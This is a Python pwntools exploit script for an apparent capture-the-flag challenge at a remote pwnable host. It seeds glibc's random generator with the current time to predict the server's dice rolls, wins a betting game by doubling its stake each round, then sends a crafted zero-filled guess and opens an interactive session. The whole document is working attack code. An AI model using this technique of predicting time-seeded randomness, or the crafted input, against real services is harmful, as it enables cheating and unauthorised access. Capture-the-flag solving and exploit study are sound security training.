from pwn import *
from ctypes import *

#io=process('./chall')
io=remote('chall-us.pwnable.hk', 20001)
elf=context.binary=ELF('./chall')
libc=ELF('./libc.so.6')
context.log_level='debug'

glibc=cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')
glibc.srand(glibc.time(None))

v9=0x17D7840
v8=20
v6=20

while(v8<v9):
    io.sendlineafter(b'Enter your bet (or enter 0 to quit): ', str(v6).encode())
    v10=glibc.rand() % 6 +1
    v11=glibc.rand() % 6 +1
    v12=glibc.rand() % 6 +1
    v13=v10+v11+v12
    if (v13 <= 2 or v13 >9):
        v7=2
    else:
        v7=1
    io.sendlineafter(b'Enter 1 for small or 2 for big: ', str(v7).encode())
    v8+=v6
    v6=v8
    
v1=p64(0)*2
io.sendlineafter(b'Enter your guess:', v1)
io.interactive()
